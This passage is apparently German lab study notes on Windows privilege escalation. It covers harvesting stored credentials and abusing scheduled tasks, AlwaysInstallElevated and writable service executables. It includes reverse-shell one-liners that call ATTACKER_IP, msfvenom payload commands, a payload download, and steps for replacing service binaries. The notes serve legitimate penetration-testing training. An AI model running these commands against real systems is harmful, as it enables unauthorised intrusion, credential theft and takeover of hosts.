# Generelle Infos
Vereinfacht gesagt, besteht die Privilegieneskalation darin, dass "Benutzer A" Zugang zu einem Host erhält und diesen nutzt, um durch Ausnutzung einer Schwachstelle im Zielsystem Zugang zu "Benutzer B" zu erhalten. Obwohl wir normalerweise wollen, dass "Benutzer B" über administrative Rechte verfügt, kann es Situationen geben, in denen wir uns in andere nicht privilegierte Konten einklinken müssen, bevor wir tatsächlich administrative Rechte erhalten.
Der Zugriff auf verschiedene Konten kann so einfach sein wie das Auffinden von Anmeldeinformationen in Textdateien oder in Tabellen, die von einem unvorsichtigen Benutzer ungesichert gelassen wurden, aber das ist nicht immer der Fall. Je nach Situation müssen wir möglicherweise einige der folgenden Schwachstellen ausnutzen:

- Fehlkonfigurationen bei Windows-Diensten oder geplanten Aufgaben
- Übermäßige Rechte, die unserem Konto zugewiesen wurden
- Anfällige Software
- Fehlende Windows-Sicherheitspatches
- Bevor wir uns mit den eigentlichen Techniken befassen, sollten wir uns die verschiedenen Kontotypen auf einem Windows-System ansehen.

#### User Arten in Windows 
Windows hat Primär zwei arten an Nutzern, welche sich anhand ihrer Berechtigungen in 2 Gruppen aufteilen lässt.

| UserGruppe      | Zugriff                                                                                                                                                                                                                               |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Administratoren | Diese Nutzer haben die meisten Rechte, sie können System Configs ändern und auf jede Datei im System zugreifen                                                                                                                        |
| Standard User   | Diese Benutzer können auf den Computer zugreifen, aber nur begrenzte Aufgaben ausführen. Normalerweise können diese Benutzer keine dauerhaften oder wesentlichen Änderungen am System vornehmen und sind auf ihre Dateien beschränkt. |

Jeder Benutzer mit administrativen Rechten ist Teil der Gruppe Administratoren. Standardbenutzer hingegen sind Teil der Gruppe Benutzer.
Darüber hinaus hört man in der Regel von einigen speziellen eingebauten Konten, die vom Betriebssystem im Zusammenhang mit der Eskalation von Rechten verwendet werden:

| Built in Account     | Zugriff                                                                                                                                                                                                         |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SYSTEM / LocalSystem | Ein Konto, das vom Betriebssystem zur Ausführung interner Aufgaben verwendet wird. Es hat vollen Zugriff auf alle auf dem Host verfügbaren Dateien und Ressourcen mit noch höheren Rechten als Administratoren. |
| Lokaler Dienst       | Standardkonto, das zur Ausführung von Windows-Diensten mit "minimalen" Rechten verwendet wird. Es wird anonyme Verbindungen über das Netzwerk verwenden.                                                        |
| Netzwerkdienst       | Standardkonto, das zur Ausführung von Windows-Diensten mit "minimalen" Rechten verwendet wird. Es verwendet die Anmeldeinformationen des Computers, um sich über das Netzwerk zu authentifizieren.              |

# Sammeln von Passwörtern aus Bekannten Orten

Der einfachste Weg, sich Zugang zu einem anderen Benutzer zu verschaffen, ist das Sammeln von Anmeldedaten von einem kompromittierten Rechner. Solche Zugangsdaten können aus vielen Gründen existieren, z. B. wenn ein unvorsichtiger Benutzer sie in Klartextdateien hinterlässt oder wenn sie von Software wie Browsern oder E-Mail-Clients gespeichert werden.

### Unbeaufsichtigte Windows-Installationen
 Bei der Installation von Windows auf einer großen Anzahl von Hosts können Administratoren Windows Deployment Services verwenden, mit denen ein einziges Betriebssystem-Image über das Netzwerk auf mehreren Hosts bereitgestellt werden kann. Diese Art von Installationen werden als unbeaufsichtigte Installationen bezeichnet, da sie keine Benutzerinteraktion erfordern. Solche Installationen erfordern die Verwendung eines Administratorkontos, um die anfängliche Einrichtung durchzuführen, die auf dem Rechner an folgenden Stellen gespeichert werden kann:
 - C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

Innerhalb dieser Datein können Passwörter in dem Folgenden Format hinterlegt sein 
```
shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell Verlauf  

Jedes Mal, wenn ein Benutzer einen Befehl mit Powershell ausführt, wird dieser in einer Datei gespeichert, die eine Erinnerung an frühere Befehle enthält. Dies ist nützlich, um Befehle, die zuvor verwendet wurden, schnell zu wiederholen. Wenn ein Benutzer einen Befehl ausführt, der ein Kennwort direkt als Teil der Powershell-Befehlszeile enthält, kann es später mit dem folgenden Befehl von einer cmd-Eingabeaufforderung abgerufen werden:

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Gespeicherte Windows Credentials
  
Windows ermöglicht es uns, die Anmeldedaten anderer Benutzer zu verwenden. Diese Funktion bietet auch die Möglichkeit, diese Anmeldeinformationen im System zu speichern. Der folgende Befehl listet die gespeicherten Anmeldeinformationen auf:
```
cmdkey /list
```
  
Zwar kann man die tatsächlichen Passwörter nicht sehen, aber wenn man einige Zugangsdaten sieht, die es wert sind, ausprobiert zu werden, kann man sie mit dem Befehl `runas` und der Option `/savecred` verwenden, wie unten zu sehen.
```
runas /savecred /user:admin cmd.exe
```

### IIS Configuration
  
Internet Information Services (IIS) ist der Standard-Webserver auf Windows-Installationen. Die Konfiguration von Websites auf IIS wird in einer Datei namens `web.config` gespeichert und kann Passwörter für Datenbanken oder konfigurierte Authentifizierungsmechanismen speichern. Je nach der installierten Version von IIS kann web.config an einem der folgenden Orte zu finden sein:
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Hier ist eine schnelle Methode, um Datenbankverbindungszeichenfolgen in der Datei zu finden:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### Passwörter aus Applikationen holen: PuTTY

PuTTY ist ein SSH-Client, der häufig auf Windows-Systemen zu finden ist. Anstatt die Parameter einer Verbindung jedes Mal neu festlegen zu müssen, können Benutzer Sitzungen speichern, in denen die IP, der Benutzer und andere Konfigurationen zur späteren Verwendung gespeichert werden. PuTTY erlaubt es Benutzern zwar nicht, ihr SSH-Passwort zu speichern, aber es speichert Proxy-Konfigurationen, die Authentifizierungsdaten im Klartext enthalten.

Um die gespeicherten Proxy-Zugangsdaten abzurufen, kann man mit dem folgenden Befehl unter dem folgenden Registrierungsschlüssel nach ProxyPassword suchen:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```


## Andere Schnelle Siege

### Scheduled Tasks
Wenn man sich die geplanten Aufgaben auf dem Zielsystem ansieht, sieht man vielleicht eine geplante Aufgabe, die entweder ihre Binärdatei verloren hat oder eine Binärdatei verwendet, die man ändern kann. Geplante Aufgaben können über die Befehlszeile mit dem Befehl `schtasks` ohne Optionen aufgelistet werden. Um detaillierte Informationen über einen der Dienste abzurufen, kann man einen Befehl wie den folgenden verwenden:

```
schtasks /query /tn vulntask /fo list /v
```

Man erhält viele Informationen über die Task, aber was für uns wichtig ist, ist der Parameter „Task to Run“, der angibt, was von der geplanten Task ausgeführt werden soll, und der Parameter „Run As User“, der den Benutzer angibt, der für die Ausführung der Task verwendet werden soll.

  Wenn unser aktueller Benutzer die ausführbare Datei „Task to Run“ ändern oder überschreiben kann, können wir kontrollieren, was von dem Benutzer *Beispielnutzer* ausgeführt wird, was zu einer einfachen Privilegienerweiterung führt. Um die Dateiberechtigungen für die ausführbare Datei zu überprüfen, verwenden wir icacls:
```
  icacls c:\tasks\schtask.bat
```
Wie im Ergebnis zu sehen ist, hat die Gruppe BUILTIN\Users vollen Zugriff (F) auf die Binärdatei der Aufgabe. Das bedeutet, dass wir die .bat-Datei ändern und jede beliebige Payload einfügen können.  Praktischer Weise kann auf dem Besipiel gerät unter C:\tools Net Cat gefunden werden und wir können so eine Reverse Shell in die Task einbauen via:
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
Die Reverse Shell die dadurch gespawnt wird hat dann entsprefchende admin rechte.

###  AlwaysInstallElevated

Windows-Installationsdateien (auch als .msi-Dateien bekannt) werden verwendet, um Anwendungen auf dem System zu installieren. Sie werden normalerweise mit der Berechtigungsstufe des Benutzers ausgeführt, der sie startet. Sie können jedoch so konfiguriert werden, dass sie von jedem Benutzerkonto (auch von einem nicht privilegierten) mit höheren Rechten ausgeführt werden. Auf diese Weise könnte es möglich sein, eine bösartige MSI-Datei zu erzeugen, die mit Administrator-Rechten ausgeführt wird.

Für diese Methode müssen zwei Registry-Werte gesetzt werden. Sie können diese über die Befehlszeile mit den folgenden Befehlen abfragen.
```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
  
Um diese Schwachstelle ausnutzen zu können, muss beides gesetzt sein. Andernfalls ist ein Ausnutzen nicht möglich. Wenn sie gesetzt sind, kann man eine bösartige .msi-Datei mit msfvenom erzeugen, mit dem Befehl unterhalb:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```
Da hier eine Reverseshell aus Metasploit/msfvenom genutzt wird sollte man passender weise auch den Multihandler zum Fangen der Shell nutzen. 
Da es sich um eine Reverse Shell handelt, sollten Sie auch das entsprechend konfigurierte Metasploit Handler-Modul ausführen. Sobald die erstellte Datei übertragen wurde, kann der Installer mit dem unten stehenden Befehl ausgeführt werden, um die Reverse-Shell zu erhalten:
```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

# Ausnutzen von Fehl Konfigurierten Services

### Windows Services
  
Windows-Dienste werden durch den Service Control Manager (SCM) verwaltet. Der SCM ist ein Prozess, der den Status von Diensten nach Bedarf verwaltet, den aktuellen Status eines bestimmten Dienstes überprüft und allgemein eine Möglichkeit zur Konfiguration von Diensten bietet.
Jeder Dienst auf einem Windows-Rechner hat eine zugehörige ausführbare Datei, die vom SCM ausgeführt wird, sobald ein Dienst gestartet wird. Es ist wichtig zu beachten, dass ausführbare Dateien von Diensten spezielle Funktionen implementieren, um mit dem SCM kommunizieren zu können. Daher kann nicht jede ausführbare Datei erfolgreich als Dienst gestartet werden. Jeder Dienst gibt auch das Benutzerkonto an, unter dem der Dienst ausgeführt wird.

Um die Struktur eines Dienstes besser zu verstehen, überprüfen wir die Konfiguration des Dienstes apphostsvc mit dem Befehl
```
sc qc *Servicename*
bzw in dem Besipiel dann 
sc qc apphostsvc
```

https://i.imgur.com/hBI3eMq.png

Hier können wir in dem Beeipiel sehen, dass die zugehörige ausführbare Datei über den Parameter BINARY_PATH_NAME angegeben wird, und das Konto, das zur Ausführung des Dienstes verwendet wird, ist im Parameter SERVICE_START_NAME angegeben.

Dienste verfügen über eine Discretionary Access Control List (DACL), die unter anderem angibt, wer die Berechtigung hat, den Dienst zu starten, zu stoppen, anzuhalten, den Status abzufragen, die Konfiguration abzufragen oder den Dienst neu zu konfigurieren. Die DACL kann über Process Hacker (auf dem Desktop Ihres Rechners verfügbar) eingesehen werden:

https://imgur.com/zuQqnIE

Alle Konfigurationen der Dienste werden in der Registry unter `HKLM\SYSTEM\CurrentControlSet\Services\` gespeichert:
https://imgur.com/TqaLRxx

Für jeden Dienst im System gibt es einen Unterschlüssel. Auch hier können wir die zugehörige ausführbare Datei im ImagePath Wert und das zum Starten des Dienstes verwendete Konto im Wert ObjectName sehen. Wenn für den Dienst eine DACL konfiguriert wurde, wird sie in einem Unterschlüssel namens Security gespeichert. Wie inzwischen bekannt ist, können solche Registry-Einträge standardmäßig nur von Administratoren geändert werden.

###  Insecure Permissions on Service Executable
Wenn die ausführbare Datei, die mit einem Dienst verbunden ist, schwache Berechtigungen hat, die es einem Angreifer erlauben, sie zu ändern oder zu ersetzen, kann der Angreifer die Privilegien des Kontos des Dienstes auf einfache Weise erlangen.

Um zu verstehen, wie das funktioniert, schauen wir uns eine Sicherheitslücke an, die im Splinterware System Scheduler gefunden wurde. Zunächst werden wir die Konfiguration des Dienstes mit sc abfragen:

https://imgur.com/dPeEhvL

Wir sehen, dass der von der anfälligen Software installierte Dienst unter dem Namen svcuser1 ausgeführt wird und dass sich die ausführbare Datei, die mit dem Dienst verbunden ist, in `C:\Progra~2\System~1\WService.exe` befindet. Anschließend überprüfen wir die Berechtigungen für die ausführbare Datei:

  https://imgur.com/yt80nnq

Und hier haben wir etwas Interessantes. Die Gruppe Jeder hat Änderungsrechte (M) für die ausführbare Datei des Dienstes. Das bedeutet, dass wir sie einfach mit einem beliebigen Payload unserer Wahl überschreiben können, und der Dienst wird sie mit den Rechten des konfigurierten Benutzerkontos ausführen.
Erzeugen wir einen Payload für einen Exe-Dienst mit msfvenom und stellen ihn über einen Python-Webserver bereit:

Befehl für msfvenom 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
Befehl für den Python web server zum Bereitstellen:
```
python3 -m http.server
```

Die Payload kann dann via Powershell mit dem Folgenden Befehl geladen werden: 

```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Sobald sich die Payload auf dem Windows-Server befindet, ersetzen wir die ausführbare Datei des Dienstes durch unsere Payload. Da wir einen anderen Benutzer benötigen, um unseren Payload auszuführen, müssen wir der Gruppe „Jeder“ ebenfalls volle Berechtigungen gewähren:
Das machen wir mit den Befehlen: 
```
cd C:\PROGRA~2\SYSTEM~1\    #um in das Verzeichniss zu navigieren
move WService.exe WService.exe.bkp   #Um die Orginale Datei umzubenennen zu WSERVICE.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe    #Verschieben un Umbenennen der Payload
icacls WService.exe /grant Everyone:F       #Allen Nutzern volle rechte geben
```
http://imgur.com/QvxL7UX

Jetzt starten wir unseren Listener für die Reverse shell via `nc -lvp 4445` und im Anschluss kann der Dienst neugestartet werden via 
```
sc stop windowscheduler
sc start windowscheduler
```

### Unquoted Service Paths

Wenn wir nicht wie bisher direkt in die ausführbaren Dateien eines Dienstes schreiben können, gibt es immer noch die Möglichkeit, einen Dienst dazu zu zwingen, beliebige ausführbare Dateien auszuführen, indem man eine ziemlich obskure Funktion nutzt.
Bei der Arbeit mit Windows-Diensten tritt ein ganz besonderes Verhalten auf, wenn der Dienst so konfiguriert ist, dass er auf eine „unquotierte“ ausführbare Datei verweist. Mit „unquotiert“ ist gemeint, dass der Pfad der zugehörigen ausführbaren Datei nicht richtig in Anführungszeichen gesetzt ist, um Leerzeichen im Befehl zu berücksichtigen.
Schauen wir uns als Beispiel den Unterschied zwischen zwei Diensten an (diese Dienste dienen nur als Beispiel und sind auf Ihrem Rechner möglicherweise nicht verfügbar). Der erste Dienst verwendet ein korrektes Anführungszeichen, so dass der SCM zweifelsfrei weiß, dass er die Binärdatei mit dem Namen „C:\Programme\RealVNC\VNC Server\vncserver.exe“, gefolgt von den angegebenen Parametern, ausführen muss:

